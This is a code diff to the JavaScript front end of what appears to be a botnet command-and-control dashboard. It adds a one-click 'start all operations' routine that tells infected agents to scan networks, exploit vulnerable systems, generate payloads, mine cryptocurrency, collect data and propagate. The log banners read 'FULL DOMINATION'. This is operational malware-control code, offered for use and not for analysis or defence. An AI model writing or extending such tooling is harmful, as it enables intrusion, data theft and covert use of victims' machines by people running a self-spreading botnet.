@@ -709,7 +709,7 @@ async function startAll() {
     return;
   }
   
-  if (!confirm(`🚀 START ALL OPERATIONS?\n\nAgents: ${totalAgents} total, ${onlineAgents} online\n\nThis will:\n• Start mining on all agents\n• Start data collection\n• Begin propagation`)) return;
+  if (!confirm(`🚀 START ALL OPERATIONS?\n\nAgents: ${totalAgents} total, ${onlineAgents} online\n\nThis will:\n• Scan network for targets\n• Exploit vulnerable systems\n• Generate payloads\n• Start mining\n• Collect data\n• Begin propagation`)) return;
   
   const btn = document.getElementById('btn-start-all');
   const status = document.getElementById('start-status');
@@ -717,16 +717,37 @@ async function startAll() {
   btn.style.opacity = '0.7';
   
   log('warn', '═══════════════════════════════════════════', 'sys');
-  log('warn', 'STARTING DOMINATION', 'sys');
+  log('warn', 'STARTING FULL DOMINATION', 'sys');
   log('warn', '═══════════════════════════════════════════', 'sys');
   
   try {
-    // 1. Start mining on all agents
+    // 1. Network Scan
+    log('info', '🔍 Starting network scan...', 'sys');
+    const scanResult = await fetch(`${API}/api/exploitation/scan`, { method: 'POST' }).then(r => r.json());
+    log('success', `   → Scan tasks sent to ${scanResult.agents_targeted || 0} agents`, 'sys');
+    document.getElementById('exploit-scanned').textContent = scanResult.agents_targeted || 0;
+    
+    // 2. Exploitation
+    log('info', '💉 Starting exploitation...', 'sys');
+    const exploitResult = await fetch(`${API}/api/exploitation/exploit`, { method: 'POST' }).then(r => r.json());
+    log('success', `   → Exploit tasks sent to ${exploitResult.agents_targeted || 0} agents`, 'sys');
+    document.getElementById('exploited-count').textContent = exploitResult.agents_targeted || 0;
+    
+    // 3. Generate Payloads
+    log('info', '📦 Generating payloads...', 'sys');
+    const payloadResult = await fetch(`${API}/api/payloads/generate`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'all' })
+    }).then(r => r.json());
+    log('success', `   → ${payloadResult.payloads_created || 0} payloads generated`, 'sys');
+    
+    // 4. Start mining
     log('info', '⛏️ Starting mining operations...', 'sys');
     const miningResult = await fetch(`${API}/api/mining/start-all`, { method: 'POST' }).then(r => r.json());
     log('success', `   → Mining started on ${miningResult.agents_targeted || 0} agents`, 'sys');
     
-    // 2. Start data collection on all agents
+    // 5. Start data collection
     log('info', '📊 Starting data collection...', 'sys');
     const collectResult = await fetch(`${API}/api/global/agents/task-all`, {
       method: 'POST',
@@ -735,7 +756,7 @@ async function startAll() {
     }).then(r => r.json());
     log('success', `   → Collection tasks sent to ${collectResult.agents_targeted || 0} agents`, 'sys');
     
-    // 3. Start propagation
+    // 6. Start propagation
     log('info', '🦠 Starting propagation...', 'sys');
     const propResult = await fetch(`${API}/api/propagation/start`, { method: 'POST' }).then(r => r.json());
     log('success', `   → Propagation started: ${propResult.agents_targeted || 0} agents`, 'sys');
@@ -746,8 +767,11 @@ async function startAll() {
     log('success', '═══════════════════════════════════════════', 'sys');
     log('success', '✅ ALL OPERATIONS STARTED', 'sys');
     log('success', `   Agents: ${totalAgents}`, 'sys');
+    log('success', `   Scanning: Active`, 'sys');
+    log('success', `   Exploitation: Active`, 'sys');
     log('success', `   Mining: Active`, 'sys');
     log('success', `   Collection: Active`, 'sys');
+    log('success', `   Propagation: Active`, 'sys');
     log('success', '═══════════════════════════════════════════', 'sys');
     
     // Reload stats
